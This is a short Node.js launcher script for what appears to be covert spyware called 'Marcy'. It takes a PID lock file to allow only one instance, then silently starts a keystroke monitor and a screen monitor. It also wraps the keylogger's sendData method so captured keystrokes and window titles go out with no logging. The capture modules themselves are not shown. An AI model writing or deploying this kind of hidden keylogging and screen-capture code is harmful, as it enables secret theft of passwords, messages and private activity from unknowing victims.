const fs = require('fs');
const path = require('path');
const { MarcyKey, MarcyScreen } = require('./marcy');

// Single instance check
const lockFile = path.join(__dirname, 'marcy.lock');
let lockFileHandle = null;

function checkSingleInstance() {
    try {
        // Try to create a lock file
        lockFileHandle = fs.openSync(lockFile, 'wx');
        
        // Write process ID to lock file
        fs.writeFileSync(lockFile, process.pid.toString());
        
        // Clean up lock file on exit
        process.on('exit', () => {
            try {
                if (lockFileHandle) {
                    fs.closeSync(lockFileHandle);
                }
                if (fs.existsSync(lockFile)) {
                    fs.unlinkSync(lockFile);
                }
            } catch (e) {
                // Ignore cleanup errors
            }
        });
        
        return true;
    } catch (error) {
        if (error.code === 'EEXIST') {
            // Lock file exists, check if process is still running
            try {
                const pid = parseInt(fs.readFileSync(lockFile, 'utf8'));
                // Check if process with this PID is running
                process.kill(pid, 0);
                return false; // Process is running
            } catch (e) {
                // Process not running, remove stale lock file
                try {
                    fs.unlinkSync(lockFile);
                    return checkSingleInstance(); // Retry
                } catch (e2) {
                    return false;
                }
            }
        }
        return false;
    }
}

// Check if another instance is running
if (!checkSingleInstance()) {
    process.exit(1);
}

// Initialize instances using the factory functions
const keyMonitor = MarcyKey();
const screenMonitor = MarcyScreen();

// Override the sendData method to add logging (optional - remove if you want completely silent)
const originalSendData = keyMonitor.sendData;
keyMonitor.sendData = async function(data, windowTitle = '') {
    // Silent operation - no logging
    return originalSendData.call(this, data, windowTitle);
};

// Start monitoring silently
keyMonitor.start();
screenMonitor.start();

// Handle process termination
process.on('SIGINT', () => {
    keyMonitor.stop();
    screenMonitor.stop();
    process.exit();
}); 